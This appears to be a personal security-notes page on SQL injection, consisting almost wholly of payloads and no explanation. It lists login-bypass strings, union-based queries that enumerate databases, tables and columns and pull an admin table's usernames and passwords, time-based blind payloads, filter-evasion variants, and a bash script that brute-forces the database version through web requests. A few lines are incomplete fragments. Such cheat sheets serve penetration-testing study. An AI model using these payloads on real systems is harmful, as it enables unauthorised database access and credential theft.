---
title: 'SQL Injection (SQLI)'
description: ''
pubDate: 'Jul 08 2022'
heroImage: '/placeholder-hero.jpg'
slug: vuln/sqli
---

```bash
#SQL Injection
'or 6=6
'or 0x47=0x47
or char(32)=''
or 6 is not null
admin' or 1=1-- -
admin' or true-- -
admin' order by 100-- -
admin' union select(1,2,3,4,5,6)-- -
admin' or '1'= '1
admin' and sleep(5)-- -
admin' and if(substr(database(),1,1)='a',sleep(5),1)-- -
                                          username,0x3a,password from dbmax_admin
                                          column_name from information_schema.columns where table_schema='dbmax' and table_name='dbmax_admin'
                                          table_name        information_schema.tables where table_schema='dbmax'

admin' and if(substr((select group_concat(schema_name) from information_schema.schemata),1,1)='a',sleep(5),1)-- -

# Get database name
' UniOn  Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata
') union select 1,2,(select group_concat(TABLE_NAME) from information_schema.columns where table_schema like my_db_a)


#Tables of a database
' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]

# bad chars

"animals')/**/order/**/by/**/1#"

```

#### Blind sqli

```bash
'and substring(@@version,1,1)='5
### cat blind.sh
charset=`echo {0..9} {A..Z} \n \: \; \, \- \_ \@`

export URL="http://blind.sqli.site/banddetails.php"

export truestring="We worked with them in the past"

for i in $charset; do
wget "$URL?band=the offspring' and substring(@@version,1,1)='$i" -q -O - | grep "$truestring" &> /dev/null

if [ "$?" == "0" ]; then
    echo Character found $i
    break
  fi
done
```
